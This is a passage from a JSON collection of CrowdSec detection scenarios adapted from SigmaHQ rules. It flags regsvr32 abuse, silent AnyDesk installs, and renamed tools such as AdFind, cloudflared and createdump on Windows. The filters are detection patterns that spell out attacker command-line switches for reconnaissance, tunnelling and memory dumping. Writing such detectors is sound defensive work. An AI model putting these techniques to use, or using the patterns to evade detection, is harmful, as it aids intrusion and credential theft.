sigmahq/proc_creation_win_regsvr32_susp_exec_path_2\ndescription: |\n  Detects execution of regsvr32 where the DLL is located in a highly suspicious locations\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\regsvr32.exe' || evt.Parsed.OriginalFileName == 'REGSVR32.EXE') && (evt.Parsed.CommandLine contains ':\\\\PerfLogs\\\\' || evt.Parsed.CommandLine contains ':\\\\Temp\\\\' || evt.Parsed.CommandLine contains '\\\\Windows\\\\Registration\\\\CRMLog' || evt.Parsed.CommandLine contains '\\\\Windows\\\\System32\\\\com\\\\dmp\\\\' || evt.Parsed.CommandLine contains '\\\\Windows\\\\System32\\\\FxsTmp\\\\' || evt.Parsed.CommandLine contains '\\\\Windows\\\\System32\\\\Microsoft\\\\Crypto\\\\RSA\\\\MachineKeys\\\\' || evt.Parsed.CommandLine contains '\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color\\\\' || evt.Parsed.CommandLine contains '\\\\Windows\\\\System32\\\\spool\\\\PRINTERS\\\\' || evt.Parsed.CommandLine contains '\\\\Windows\\\\System32\\\\spool\\\\SERVERS\\\\' || evt.Parsed.CommandLine contains '\\\\Windows\\\\System32\\\\Tasks_Migrated\\\\' || evt.Parsed.CommandLine contains '\\\\Windows\\\\System32\\\\Tasks\\\\Microsoft\\\\Windows\\\\SyncCenter\\\\' || evt.Parsed.CommandLine contains '\\\\Windows\\\\SysWOW64\\\\com\\\\dmp\\\\' || evt.Parsed.CommandLine contains '\\\\Windows\\\\SysWOW64\\\\FxsTmp\\\\' || evt.Parsed.CommandLine contains '\\\\Windows\\\\SysWOW64\\\\Tasks\\\\Microsoft\\\\Windows\\\\PLA\\\\System\\\\' || evt.Parsed.CommandLine contains '\\\\Windows\\\\SysWOW64\\\\Tasks\\\\Microsoft\\\\Windows\\\\SyncCenter\\\\' || evt.Parsed.CommandLine contains '\\\\Windows\\\\Tasks\\\\' || evt.Parsed.CommandLine contains '\\\\Windows\\\\Tracing\\\\' || (evt.Parsed.CommandLine contains ' \"C:\\\\' || evt.Parsed.CommandLine contains ' C:\\\\' || evt.Parsed.CommandLine contains ' \\'C:\\\\' || evt.Parsed.CommandLine contains 'D:\\\\') && not (evt.Parsed.CommandLine contains 'C:\\\\Program Files (x86)\\\\' || evt.Parsed.CommandLine contains 'C:\\\\Program Files\\\\' || evt.Parsed.CommandLine contains 'C:\\\\ProgramData\\\\' || evt.Parsed.CommandLine contains 'C:\\\\Users\\\\' || evt.Parsed.CommandLine contains ' C:\\\\Windows\\\\' || evt.Parsed.CommandLine contains ' \"C:\\\\Windows\\\\' || evt.Parsed.CommandLine contains ' \\'C:\\\\Windows\\\\')) && not (evt.Parsed.CommandLine == '' || evt.Parsed.CommandLine == ''))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1218.010\n\n  label: \"Regsvr32 Execution From Highly Suspicious Location\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects execution of regsvr32 where the DLL is located in a highly suspicious locations\n", "path": "scenarios/sigmahq/proc_creation_win_regsvr32_susp_exec_path_2.yml", "version": "0.2", "versions": {"0.1": {"digest": "289f964d91421a9b48a1c2a5c606589df64c9c0a2e214d08b7681101ea348f37"}, "0.2": {"digest": "15e6983ca8a024f62b9dc69b13c5b8151e93919cbcf9895df14b7a607c2af74d"}}}, "sigmahq/proc_creation_win_regsvr32_susp_extensions": {"content": "type: trigger\nname: sigmahq/proc_creation_win_regsvr32_susp_extensions\ndescription: |\n  Detects the execution of REGSVR32.exe with DLL files masquerading as other files\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\regsvr32.exe' || evt.Parsed.OriginalFileName == 'REGSVR32.EXE') && (evt.Parsed.CommandLine endsWith '.bin' || evt.Parsed.CommandLine endsWith '.bmp' || evt.Parsed.CommandLine endsWith '.cr2' || evt.Parsed.CommandLine endsWith '.dat' || evt.Parsed.CommandLine endsWith '.eps' || evt.Parsed.CommandLine endsWith '.gif' || evt.Parsed.CommandLine endsWith '.ico' || evt.Parsed.CommandLine endsWith '.jpeg' || evt.Parsed.CommandLine endsWith '.jpg' || evt.Parsed.CommandLine endsWith '.nef' || evt.Parsed.CommandLine endsWith '.orf' || evt.Parsed.CommandLine endsWith '.png' || evt.Parsed.CommandLine endsWith '.raw' || evt.Parsed.CommandLine endsWith '.sr2' || evt.Parsed.CommandLine endsWith '.temp' || evt.Parsed.CommandLine endsWith '.tif' || evt.Parsed.CommandLine endsWith '.tiff' || evt.Parsed.CommandLine endsWith '.tmp' || evt.Parsed.CommandLine endsWith '.rtf' || evt.Parsed.CommandLine endsWith '.txt'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1218.010\n\n  label: \"Regsvr32 DLL Execution With Suspicious File Extension\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the execution of REGSVR32.exe with DLL files masquerading as other files\n", "path": "scenarios/sigmahq/proc_creation_win_regsvr32_susp_extensions.yml", "version": "0.2", "versions": {"0.1": {"digest": "28f8b5b9b9627be79ec564f0c5a1a2ce48fce39177789f2a5e7364ed24c85940"}, "0.2": {"digest": "a3c4ce953007d4250f4ddda965b8c92983cf6427b243055cb5e3ad0451426a07"}}}, "sigmahq/proc_creation_win_remote_access_tools_anydesk_silent_install": {"content": "type: trigger\nname: sigmahq/proc_creation_win_remote_access_tools_anydesk_silent_install\ndescription: |\n  Detects AnyDesk Remote Desktop silent installation. Which can be used by attackers to gain remote access.\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.CommandLine contains '--install' && evt.Parsed.CommandLine contains '--start-with-win' && evt.Parsed.CommandLine contains '--silent')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1219\n\n  label: \"Remote Access Tool - AnyDesk Silent Installation\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects AnyDesk Remote Desktop silent installation. Which can be used by attackers to gain remote access.\n", "path": "scenarios/sigmahq/proc_creation_win_remote_access_tools_anydesk_silent_install.yml", "version": "0.2", "versions": {"0.1": {"digest": "077780c7e2babaa37a158f6105e6420cde213a1ed6ca9490ba49a8c81f619ef4"}, "0.2": {"digest": "24986b133ef030af6713b6f7f87ee16195ff55c309f007d92f2442868b96fd83"}}}, "sigmahq/proc_creation_win_remote_access_tools_anydesk_susp_exec": {"content": "type: trigger\nname: sigmahq/proc_creation_win_remote_access_tools_anydesk_susp_exec\ndescription: |\n  An adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks. These services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment. Remote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries. (Citation: Symantec Living off the Land) \nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\AnyDesk.exe' || evt.Parsed.Description == 'AnyDesk' || evt.Parsed.Product == 'AnyDesk' || evt.Parsed.Company == 'AnyDesk Software GmbH') && not (evt.Parsed.Image contains '\\\\AppData\\\\' || evt.Parsed.Image contains 'Program Files (x86)\\\\AnyDesk' || evt.Parsed.Image contains 'Program Files\\\\AnyDesk'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1219\n\n  label: \"Remote Access Tool - Anydesk Execution From Suspicious Folder\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "An adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks. These services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment. Remote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries. (Citation: Symantec Living off the Land) \n", "path": "scenarios/sigmahq/proc_creation_win_remote_access_tools_anydesk_susp_exec.yml", "version": "0.2", "versions": {"0.1": {"digest": "5e0179b7c7b0a7677862d3f23f4876aa3afd7005e037f86664efded5675d2a58"}, "0.2": {"digest": "a60555ce563887f3d80e3b578af51252a1ad06f7a669cfb27a666e61a71c8612"}}}, "sigmahq/proc_creation_win_renamed_adfind": {"content": "type: trigger\nname: sigmahq/proc_creation_win_renamed_adfind\ndescription: |\n  Detects the use of a renamed Adfind.exe. AdFind continues to be seen across majority of breaches. It is used to domain trust discovery to plan out subsequent steps in the attack chain.\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.CommandLine contains 'domainlist' || evt.Parsed.CommandLine contains 'trustdmp' || evt.Parsed.CommandLine contains 'dcmodes' || evt.Parsed.CommandLine contains 'adinfo' || evt.Parsed.CommandLine contains ' dclist ' || evt.Parsed.CommandLine contains 'computer_pwdnotreqd' || evt.Parsed.CommandLine contains 'objectcategory=' || evt.Parsed.CommandLine contains '-subnets -f' || evt.Parsed.CommandLine contains 'name=\"Domain Admins\"' || evt.Parsed.CommandLine contains '-sc u:' || evt.Parsed.CommandLine contains 'domainncs' || evt.Parsed.CommandLine contains 'dompol' || evt.Parsed.CommandLine contains ' oudmp ' || evt.Parsed.CommandLine contains 'subnetdmp' || evt.Parsed.CommandLine contains 'gpodmp' || evt.Parsed.CommandLine contains 'fspdmp' || evt.Parsed.CommandLine contains 'users_noexpire' || evt.Parsed.CommandLine contains 'computers_active' || evt.Parsed.CommandLine contains 'computers_pwdnotreqd' || evt.Parsed.Imphash in ['bca5675746d13a1f246e2da3c2217492', '53e117a96057eaf19c41380d0e87f1c2'] || evt.Parsed.Hashes contains 'IMPHASH=BCA5675746D13A1F246E2DA3C2217492' || evt.Parsed.Hashes contains 'IMPHASH=53E117A96057EAF19C41380D0E87F1C2' || evt.Parsed.OriginalFileName == 'AdFind.exe') && not (evt.Parsed.Image endsWith '\\\\AdFind.exe'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1018\n   - attack.t1087.002\n   - attack.t1482\n   - attack.t1069.002\n\n  label: \"Renamed AdFind Execution\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the use of a renamed Adfind.exe. AdFind continues to be seen across majority of breaches. It is used to domain trust discovery to plan out subsequent steps in the attack chain.\n", "path": "scenarios/sigmahq/proc_creation_win_renamed_adfind.yml", "version": "0.2", "versions": {"0.1": {"digest": "84b255551c73ba6d256cab454f144e7df7ff85a230879d5641d344a419e94ed5"}, "0.2": {"digest": "5779f2fb1f96c779e68a01c208547c2c1fb75e25f73e4caac6233bd8979c55f9"}}}, "sigmahq/proc_creation_win_renamed_autoit": {"content": "type: trigger\nname: sigmahq/proc_creation_win_renamed_autoit\ndescription: |\n  Detects the execution of a renamed AutoIt2.exe or AutoIt3.exe. AutoIt is a scripting language and automation tool for Windows systems. While primarily used for legitimate automation tasks, it can be misused in cyber attacks. Attackers can leverage AutoIt to create and distribute malware, including keyloggers, spyware, and botnets. A renamed AutoIt executable is particularly suspicious. \nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.CommandLine contains ' /AutoIt3ExecuteScript' || evt.Parsed.CommandLine contains ' /ErrorStdOut' || evt.Parsed.Imphash in ['fdc554b3a8683918d731685855683ddf', 'cd30a61b60b3d60cecdb034c8c83c290', 'f8a00c72f2d667d2edbb234d0c0ae000'] || evt.Parsed.Hashes contains 'IMPHASH=FDC554B3A8683918D731685855683DDF' || evt.Parsed.Hashes contains 'IMPHASH=CD30A61B60B3D60CECDB034C8C83C290' || evt.Parsed.Hashes contains 'IMPHASH=F8A00C72F2D667D2EDBB234D0C0AE000' || evt.Parsed.OriginalFileName in ['AutoIt3.exe', 'AutoIt2.exe', 'AutoIt.exe']) && not (evt.Parsed.Image endsWith '\\\\AutoIt.exe' || evt.Parsed.Image endsWith '\\\\AutoIt2.exe' || evt.Parsed.Image endsWith '\\\\AutoIt3_x64.exe' || evt.Parsed.Image endsWith '\\\\AutoIt3.exe'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1027\n\n  label: \"Renamed AutoIt Execution\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the execution of a renamed AutoIt2.exe or AutoIt3.exe. AutoIt is a scripting language and automation tool for Windows systems. While primarily used for legitimate automation tasks, it can be misused in cyber attacks. Attackers can leverage AutoIt to create and distribute malware, including keyloggers, spyware, and botnets. A renamed AutoIt executable is particularly suspicious. \n", "path": "scenarios/sigmahq/proc_creation_win_renamed_autoit.yml", "version": "0.2", "versions": {"0.1": {"digest": "4e63e5a79eb4e3cde5006eb96f00e6176078c1dee07b47f3e9177a458e79a77b"}, "0.2": {"digest": "77c87d756ccb9c190856c4c6cb1e404bc38787f0df6701bc5ee96f18509c80a8"}}}, "sigmahq/proc_creation_win_renamed_binary_highly_relevant": {"content": "type: trigger\nname: sigmahq/proc_creation_win_renamed_binary_highly_relevant\ndescription: |\n  Detects the execution of a renamed binary often used by attackers or malware leveraging new Sysmon OriginalFileName datapoint.\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Description == 'Execute processes remotely' || evt.Parsed.Product == 'Sysinternals PsExec' || evt.Parsed.Description startsWith 'Windows PowerShell' || evt.Parsed.Description startsWith 'pwsh' || evt.Parsed.OriginalFileName in ['certutil.exe', 'cmstp.exe', 'cscript.exe', 'mshta.exe', 'msiexec.exe', 'powershell_ise.exe', 'powershell.exe', 'psexec.c', 'psexec.exe', 'psexesvc.exe', 'pwsh.dll', 'reg.exe', 'regsvr32.exe', 'rundll32.exe', 'WerMgr', 'wmic.exe', 'wscript.exe']) && not (evt.Parsed.Image endsWith '\\\\certutil.exe' || evt.Parsed.Image endsWith '\\\\cmstp.exe' || evt.Parsed.Image endsWith '\\\\cscript.exe' || evt.Parsed.Image endsWith '\\\\mshta.exe' || evt.Parsed.Image endsWith '\\\\msiexec.exe' || evt.Parsed.Image endsWith '\\\\powershell_ise.exe' || evt.Parsed.Image endsWith '\\\\powershell.exe' || evt.Parsed.Image endsWith '\\\\psexec.exe' || evt.Parsed.Image endsWith '\\\\psexec64.exe' || evt.Parsed.Image endsWith '\\\\PSEXESVC.exe' || evt.Parsed.Image endsWith '\\\\pwsh.exe' || evt.Parsed.Image endsWith '\\\\reg.exe' || evt.Parsed.Image endsWith '\\\\regsvr32.exe' || evt.Parsed.Image endsWith '\\\\rundll32.exe' || evt.Parsed.Image endsWith '\\\\wermgr.exe' || evt.Parsed.Image endsWith '\\\\wmic.exe' || evt.Parsed.Image endsWith '\\\\wscript.exe'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1036.003\n\n  label: \"Potential Defense Evasion Via Rename Of Highly Relevant Binaries\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the execution of a renamed binary often used by attackers or malware leveraging new Sysmon OriginalFileName datapoint.\n", "path": "scenarios/sigmahq/proc_creation_win_renamed_binary_highly_relevant.yml", "version": "0.2", "versions": {"0.1": {"digest": "6d7946e0c5a4ec79584b390b8b70fe2324df44b4183c32becd3f4057db1089ec"}, "0.2": {"digest": "602d71e0c28ade7d8924993d58319ae27c21af10eb4936cf5ecdca6e3589a412"}}}, "sigmahq/proc_creation_win_renamed_browsercore": {"content": "type: trigger\nname: sigmahq/proc_creation_win_renamed_browsercore\ndescription: |\n  Detects process creation with a renamed BrowserCore.exe (used to extract Azure tokens)\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.OriginalFileName == 'BrowserCore.exe' && not (evt.Parsed.Image endsWith '\\\\BrowserCore.exe'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1528\n   - attack.t1036.003\n\n  label: \"Renamed BrowserCore.EXE Execution\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects process creation with a renamed BrowserCore.exe (used to extract Azure tokens)\n", "path": "scenarios/sigmahq/proc_creation_win_renamed_browsercore.yml", "version": "0.2", "versions": {"0.1": {"digest": "d5e77a3c648ee8dfdbb7a3a4bb210c5ef915e0f6aa6a817aac558693abb2ecec"}, "0.2": {"digest": "c723be46d3378a811ebabe92897f53b7c00b5ed4485d20fc8729a00433b3328a"}}}, "sigmahq/proc_creation_win_renamed_cloudflared": {"content": "type: trigger\nname: sigmahq/proc_creation_win_renamed_cloudflared\ndescription: |\n  Detects the execution of a renamed \"cloudflared\" binary.\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.CommandLine contains ' tunnel ' && evt.Parsed.CommandLine contains 'cleanup ' && (evt.Parsed.CommandLine contains '-config ' || evt.Parsed.CommandLine contains '-connector-id ') || evt.Parsed.CommandLine contains ' tunnel ' && evt.Parsed.CommandLine contains ' run ' && (evt.Parsed.CommandLine contains '-config ' || evt.Parsed.CommandLine contains '-credentials-contents ' || evt.Parsed.CommandLine contains '-credentials-file ' || evt.Parsed.CommandLine contains '-token ') || evt.Parsed.CommandLine contains '-url' && evt.Parsed.CommandLine contains 'tunnel' || evt.Parsed.Hashes contains 'SHA256=2fb6c04c4f95fb8d158af94c137f90ac820716deaf88d8ebec956254e046cb29' || evt.Parsed.Hashes contains 'SHA256=b3d21940a10fdef5e415ad70331ce257c24fe3bcf7722262302e0421791f87e8' || evt.Parsed.Hashes contains 'SHA256=1fbd8362b2d2d2e6a5750ae3db69cd1815e6c1d31da48a98b796450971a8e039' || evt.Parsed.Hashes contains 'SHA256=0409c9b12f9d0eda86e461ed9bdabeefb00172b26322079681a0bdf48e68dc28' || evt.Parsed.Hashes contains 'SHA256=7cfb411d04bac42ef93d1f0c93c0a481e38c6f4612b97ae89d4702595988edc7' || evt.Parsed.Hashes contains 'SHA256=5b3c2d846ab162dc6bc595cce3a49de5731afde5d6060be7066d21b013a28373' || evt.Parsed.Hashes contains 'SHA256=ce95df7f69664c3df19b76028e115931919a71517b776da7b42d353e2ff4a670' || evt.Parsed.Hashes contains 'SHA256=1293525a19cfe3bc8296b62fbfe19f083632ed644a1c18c10b045a1d3030d81a' || evt.Parsed.Hashes contains 'SHA256=af2b9161cfcb654b16408cd6b098afe9d1fb61a037d18d7090a119d4c0c8e0f0' || evt.Parsed.Hashes contains 'SHA256=39ddceb56a15798826a5fc4892fa2b474c444bb4d7a8bf2fa95e41cab10fa7a1' || evt.Parsed.Hashes contains 'SHA256=ccd11f2328023a0e7929e845d5b6e7bc783fb4650d65faef3ae090239d4bbce2' || evt.Parsed.Hashes contains 'SHA256=b6e5c5d2567ae8c69cc012ebcae30e6c9b5359d64a58d17ba75ec89f8bce71ac' || evt.Parsed.Hashes contains 'SHA256=f813484ea441404f18caad96f28138e8aaf0cb256163c09c2ab8a3acab87f69f' || evt.Parsed.Hashes contains 'SHA256=fc4a0802ab9c7409b892ca00636bec61e2acfc911bccfdeb9978b8ab5a2f828d' || evt.Parsed.Hashes contains 'SHA256=083150724b49604c8765c1ba19541fa260b133be0acb0647fcd936d81f054499' || evt.Parsed.Hashes contains 'SHA256=44303d6572956f28a0f2e4b188934fb9874f2584f5c81fa431a463cfbf28083b' || evt.Parsed.Hashes contains 'SHA256=5d38c46032a58e28ae5f7d174d8761ec3d64d186677f3ec53af5f51afb9bfd2f' || evt.Parsed.Hashes contains 'SHA256=e1e70fa42059911bc6685fafef957f9a73fc66f214d0704a9b932683a5204032' || evt.Parsed.Hashes contains 'SHA256=c01356092a365b84f84f0e66870bd1a05ba3feb53cafd973fa5fea2534bee234' || evt.Parsed.Hashes contains 'SHA256=b3f9c06151e30ee43d39e788a79cd918a314f24e04fe87f3de8272a2057b624f' || evt.Parsed.Hashes contains 'SHA256=cd81b2792f0739f473c31c9cb7cf2313154bfa28b839975802b90e8790bb5058' || evt.Parsed.Hashes contains 'SHA256=9ec7e6c8e1bfd883663d8d9d62c9e4f9ae373b731407181e32491b27a7218a2c' || evt.Parsed.Hashes contains 'SHA256=c2cfd23fdc6c0e1b1ffa0e545cbe556f18d11b362b4a89ba0713f6ab01c4827f' || evt.Parsed.Hashes contains 'SHA256=53f8adbd76c0eb16f5e43cadde422474d8a06f9c8f959389c1930042ad8beaa5' || evt.Parsed.Hashes contains 'SHA256=648c8d2f8001c113d2986dd00b7bbd181593d462bef73522cee212c4f71f95b3' || evt.Parsed.Hashes contains 'SHA256=ae047e2095e46c3f9c518b2be67ec753f4f0aad23b261a361fcb6144dcdb63b4' || evt.Parsed.Hashes contains 'SHA256=3153d2baa462978dd22ab33d1c2274ecc88c200225d6a3327f98d5b752d08f5c' || evt.Parsed.Hashes contains 'SHA256=f49cde976e628012c9db73e1c8d76081944ecf2297cdafeb78bb13290da274c4' || evt.Parsed.Hashes contains 'SHA256=d2513e58bb03ccc83affde685c6ef987924c37ce6707d8e9857e2524b0d7e90f' || evt.Parsed.Hashes contains 'SHA256=bb67c7623ba92fe64ffd9816b8d5b3b1ea3013960a30bd4cf6e295b3eb5b1bad' || evt.Parsed.Hashes contains 'SHA256=b34b3c3a91e3165d1481f0b3ec23eab93a1cfba94345a6cbfe5b18ddbd48eac7' || evt.Parsed.Hashes contains 'SHA256=f7848034e010d55f15e474ca998f96391e320ff29b00cfcc4c5e536529703e75' || evt.Parsed.Hashes contains 'SHA256=b6fc9493778cbe3bfc062d73f5cc604bc0ff058bc5e5dc6aac87f3a4008b54b6' || evt.Parsed.Hashes contains 'SHA256=f5c5e962577e2293c4ad10603816dce7cc273585969615fbf4e4bfa9eaff1688' || evt.Parsed.Hashes contains 'SHA256=d14c52d9220b606f428a8fe9f7c108b0d6f14cf71e7384749e98e6a95962e68f' || evt.Parsed.Hashes contains 'SHA256=d3a0e1a79158f3985cd49607ebe0cdfcc49cb9af96b8f43aefd0cdfe2f22e663' || evt.Parsed.Hashes contains 'SHA256=2fbbfc8299537ff80cadf9d0e27c223fe0ccb9052bf9d8763ad717bbfa521c77' || evt.Parsed.Hashes contains 'SHA256=19074674c6fbdaa573b3081745e5e26144fdf7a086d14e0e220d1814f1f13078') && not (evt.Parsed.Image endsWith '\\\\cloudflared.exe' || evt.Parsed.Image endsWith '\\\\cloudflared-windows-386.exe' || evt.Parsed.Image endsWith '\\\\cloudflared-windows-amd64.exe'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1090.001\n\n  label: \"Renamed Cloudflared.EXE Execution\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the execution of a renamed \"cloudflared\" binary.\n", "path": "scenarios/sigmahq/proc_creation_win_renamed_cloudflared.yml", "version": "0.2", "versions": {"0.1": {"digest": "a5ef152d34bd007c4acf8c7b34db1e6c1662576ae8ba13034f7639be3413b626"}, "0.2": {"digest": "a1221313b30b0b13a27ed2be5e9958e3f3ef2120a70691362a9b5cfafa8ee40c"}}}, "sigmahq/proc_creation_win_renamed_createdump": {"content": "type: trigger\nname: sigmahq/proc_creation_win_renamed_createdump\ndescription: |\n  Detects uses of a renamed legitimate createdump.exe LOLOBIN utility to dump process memory\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.OriginalFileName == 'FX_VER_INTERNALNAME_STR' || evt.Parsed.CommandLine contains ' -u ' && evt.Parsed.CommandLine contains ' -f ' && evt.Parsed.CommandLine contains '.dmp' || evt.Parsed.CommandLine contains ' --full ' && evt.Parsed.CommandLine contains ' --name ' && evt.Parsed.CommandLine contains '.dmp') && not (evt.Parsed.Image endsWith '\\\\createdump.exe'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1036\n   - attack.t1003.001\n\n  label: \"Renamed CreateDump Utility Execution\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects uses of a renamed legitimate createdump.exe LOLOBIN utility to dump process memory\n", "path": "scenarios/sigmahq/proc_creation_win_renamed_createdump.yml", "version": "0.2", "versions": {"0.1": {"digest": "9b11e3f6491fb377615fcab5ddf87248b83969d36a2235aff0febba620a01ef9"}, "0.2": {"digest": "8b023c1bf44cf8c84a686bdb6968d7f57da931430a65694ce7757f869b4e4e6c"}}}, "sigmahq/proc_creation_win_renamed_dctask64": {"content": "type: trigger\nname: sigmahq/proc_creation_win_renamed_dctask64\ndescription: |\n  Detects a renamed \"dctask64.exe\" execution, a signed binary by ZOHO Corporation part of ManageEngine Endpoint Central. This binary can be abused for DLL injection, arbitrary command and process execution. \nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Hashes contains '6834B1B94E49701D77CCB3C0895E1AFD' || evt.Parsed.Hashes contains '1BB6F93B129F398C7C4A76BB97450BBA' || evt.Parsed.Hashes contains 'FAA2AC19875FADE461C8D89DCF2710A3' || evt.Parsed.Hashes contains 'F1039CED4B91572AB7847D26032E6BBF') && not (evt.Parsed.Image endsWith '\\\\dctask64.exe'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1036\n   - attack.t1055.001\n   - attack.t1202\n   - attack.t1218\n\n  label: \"Renamed ZOHO Dctask64 Execution\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects a renamed \"dctask64.exe\" execution, a signed binary by ZOHO Corporation part of ManageEngine Endpoint Central. This binary can be abused for DLL injection, arbitrary command and process execution. \n", "path": "scenarios/sigmahq/proc_creation_win_renamed_dctask64.yml", "version": "0.2", "versions": {"0.1": {"digest": "7549d2b087fdce9486f75f442e133bd43c86b2531876e187e4302723818dc421"}, "0.2": {"digest": "e94301cae532631ff61b44dba4565f0bfbcb4a92eed4ac244108a312501843fb"}}}, "sigmahq/proc_creation_win_renamed_gpg4win": {"content": "type: trigger\nname: sigmahq/proc_creation_win_renamed_gpg4win\ndescription: |\n  Detects the execution of a renamed \"gpg.exe\". Often used by ransomware and loaders to decrypt/encrypt data.\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.OriginalFileName == 'gpg.exe' && not (evt.Parsed.Image endsWith '\\\\gpg.exe' || evt.Parsed.Image endsWith '\\\\gpg2.exe'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1486\n\n  label: \"Renamed Gpg.EXE Execution\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the execution of a renamed \"gpg.exe\". Often used by ransomware and loaders to decrypt/encrypt data.\n", "path": "scenarios/sigmahq/proc_creation_win_renamed_gpg4win.yml", "version": "0.2", "versions": {"0.1": {"digest": "ff7f8b343a2ef49c1c4ceb0440eede41c69ef2163f4781f91ecffae3f4008098"}, "0.2": {"digest": "e1b2d6b78062f6481b1c940ce4187c73d87e54e3b18b18ba1d9fc479aa4a8e34"}}}, "sigmahq/proc_creation_win_renamed_jusched": {"content": "type: trigger\nname: sigmahq/proc_creation_win_renamed_jusched\ndescription: |\n  Detects the execution of a renamed \"jusched.exe\" as seen used by the cobalt group\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Description in ['Java Update Scheduler', 'Java(TM) Update Scheduler']) && not (evt.Parsed.Image endsWith '\\\\jusched.exe'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1036.003\n\n  label: \"Renamed Jusched.EXE Execution\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the execution of a renamed \"jusched.exe\" as seen used by the cobalt group\n", "path": "scenarios/sigmahq/proc_creation_win_renamed_jusched.yml", "version": "0.2", "versions": {"0.1": {"digest": "848abab98247d89a9352105407514f4afb604ad80ad52dc03df036f2bc084ca6"}, "0.2": {"digest": "7749eb85e7658ceb3a12422e653eb33b49eb98ea39e0d4c126205d2cda904b75"}}}, "sigmahq/proc_creation_win_renamed_mavinject": {"content": "type: trigger\nname: sigmahq/proc_creation_win_renamed_mavinject\ndescription: |\n  Detects the execution of 